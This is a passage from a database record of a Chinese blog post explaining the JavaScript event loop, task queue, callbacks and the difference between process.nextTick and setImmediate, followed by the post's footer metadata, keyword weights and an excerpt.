process.nextTick(foo);\n});\n</code></pre></blockquote>\n\n<p>事实上，现在要是你写出递归的process.nextTick，Node.js会抛出一个警告，要求你改成setImmediate。</p>\n\n<p>另外，由于process.nextTick指定的回调函数是在本次"事件循环"触发，而setImmediate指定的是在下次"事件循环"触发，所以很显然，前者总是比后者发生得早，而且执行效率也高（因为不用检查"任务队列"）。</p>\n\n<p>（完）</p>\n\n        <div><h3>文档信息</h3>\n<ul>\n<li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh">创意共享3.0许可证</a>）</li>\n<li>发表日期： <abbr class="published" title="2014-10-08T21:11:16+08:00">2014年10月 8日</abbr></li>\n<li>更多内容： <a href="http://www.ruanyifeng.com/blog/archives.html" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 档案</a>  » \n<a href="http://www.ruanyifeng.com/blog/javascript/"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> JavaScript</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwcAKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://www.ruanyifeng.com/blog/www.greenvpn.org/1069807?utm_source=ruanyifeng.com" style="border: none;" target="_blank">GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-11-25 03:57:19', '2014-10-08 13:11:16', 0, '[["\\u4efb\\u52a1", 0.26091983381794215], ["\\u6267\\u884c", 0.235480017613497], ["\\u961f\\u5217", 0.21208929629721587], ["setTimeout", 0.17686945868446535], ["setImmediate", 0.14471137528728983], ["\\u4e3b\\u7ebf", 0.13759854413271688], ["function", 0.13667185443799595], ["\\u51fd\\u6570", 0.12386179290913248], ["\\u5f02\\u6b65", 0.123769010132616], ["JavaScript", 0.1205928127394082], ["console", 0.11255329189011432], ["Loop", 0.11255329189011432], ["log", 0.11255329189011432], ["process", 0.10451377104082044], ["nextTick", 0.10451377104082044], ["\\u4e8b\\u4ef6", 0.10342941446765973], ["Event", 0.09647425019152656], ["\\u8bfb\\u53d6", 0.09297549660885003], ["\\u56de\\u8c03", 0.08916115766610626], ["req", 0.08843472934223268]]', NULL, NULL, '一年前，我写了一篇《什么是 Event Loop？》，谈了我对Event Loop的理解。 上个月，我偶然看到了Philip Roberts的演讲《Help, I''m stuck in an event-loop》。这才尴尬地发现，自己的理解是错的。我决定重写这个题目，详细、完整、正确地描述JavaScript引擎的内部运行机制。下面就是我的重写。 进入正文之前，插播一条消息。我的新书《ECMAScript 6入门》出版了（版权页，内页1，内页2），铜版纸全彩印刷，非常精美，还附有索引（当然价格也比同类书籍略贵一点点）。预览和购买点击这里。 （2014年10月13日更新：本文已经做了较大修改，反映了我现在的认识。关于setTimeout的更多解释和示例，请参阅我正在写的《JavaScript标准参考教程》。） （2014年10月11日更新：朴灵老师对本文做了评注，详细得指出了文中存在的错误说法，建议阅读。） 一、为什么JavaScript是单线程？ JavaScript语言的一大特点就是单线程，也就是说，同一个时间只能做一件事。那么，为什么JavaScript不能有多个线程呢？这样能提高效率啊。 JavaScript的单线程，与它的用途有关。作为浏览器脚本语言，JavaScript的主要用途是与用户互动，以及操作DOM。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，假定JavaScript同时有两个线程，一个线程在某个DOM节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？ 所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变。 为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质。 二、任务队列 单线程就意味着，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。 如果排队是因为计算量大，CPU忙不过来，倒也算了，但是很多时候CPU是闲着的，因为IO设备（输入输出设备）很慢（比如Ajax操作从网络读取数据），不得不等着结果出来，再往下执行。 JavaScript语言的设计者意识到，这时主线程完全可以不管IO设备，挂起处于等待中的任务，先运行排在后面的任务。等到IO设备返回了结果，再回过头，把挂起的任务继续执行下去。 于是，所有任务可以分成两种，一种是同步任务（synchronous），另一种是异步任务（asynchronous）。同步任务指的是，在主线程上排队执行的任务，只有前一个任务执行完毕，才能执行后一个任务；异步任务指的是，不进入主线程、而进入"任务队列"（task queue）的任务，只有"任务队列"通知主线程，某个异步任务可以执行了，该任务才会进入主线程执行。 具体来说，异步执行的运行机制如下。（同步执行也是如此，因为它可以被视为没有异步任务的异步执行。） （1）所有同步任务都在主线程上执行，形成一个执行栈（execution context stack）。 （2）主线程之外，还存在一个"任务队列"（task queue）。只要异步任务有了运行结果，就在"任务队列"之中放置一个事件。 （3）一旦"执行栈"中的所有同步任务执行完毕，系统就会读取"任务队列"，看看里面有哪些事件。那些对应的异步任务，于是结束等待状态，进入执行栈，开始执行。 （4）主线程不断重复上面的第三步。 下图就是主线程和任务队列的示意图。 只要主线程空了，就会去读取"任务队列"，这就是JavaScript的运行机制。这个过程会不断重复。 三、事件和回调函数 "任务队列"是一个事件的队列（也可以理解成消息的队列），IO设备完成一项任务，就在"任务队列"中添加一个事件，表示相关的异步任务可以进入"执行栈"了。主线程读取"任务队列"，就是读取里面有哪些事件。 "任务队列"中的事件，除了IO设备的事件以外，还包括一些用户产生的事件（比如鼠标点击、页面滚动等等）。只要指定过回调函数，这些事件发生时就会进入"任务队列"，等待主线程读取。 所谓"回调函数"（callback），就是那些会被主线程挂起来的代码。异步任务必须指定回调函数，当主线程开始执行异步任务，就是执行对应的回调函数。 "任务队列"是一个先进先出的数据结构，排在前面的事件，优先被主线程读取。主线程的读取过程基本上是自动的，只要执行栈一清空，"任务队列"上第一位的事件就自动进入主线程。但是，由于存在后文提到的"定时器"功能，主线程首先要检查一下执行时间，某些事件只有到了规定的时间，才能返回主线程。 四、Event Loop 主线程从"任务队列"中读取事件，这个过程是循环不断的，所以整个的这种运行机制又称为Event Loop（事件循环）。 为了更好地理解Event Loop，请看下图（转引自Philip Roberts的演讲《Help, I''m stuck in an event-loop》）。 上图中，主线程运行的时候，产生堆（heap）和栈（stack），栈中的代码调用各种外部API，它们在"任务队列"中加入各种事件（click，load，done）。只要栈中的代码执行完毕，主线程就会去读取"任务队列"，依次执行那些事件所对应的回调函数。 执行栈中的代码（同步任务），总是在读取"任务队列"（异步任务）之前执行。请看下面这个例子。 var req = new XMLHttpRequest(); req.open(''GET'', url); req.onload = function (){}; req.onerror = function (){}; req.send(); 上面代码中的req.send方法是Ajax操作向服务器发送数据，它是一个异步任务，意味着只有当前脚本的所有代码执行完，系统才会去读取"任务队列"。所以，它与下面的写法等价。 var req = new XMLHttpRequest(); req.open(''GET'', url); req.send(); req.onload = function (){}; req.onerror = function (){}; 也就是说，指定回调函数的部分（onload和onerror），在send()方法的前面或后面无关紧要，因为它们属于执行栈的一部分，系统总是执行完它们，才会去读取"任务队列"。 五、定时器 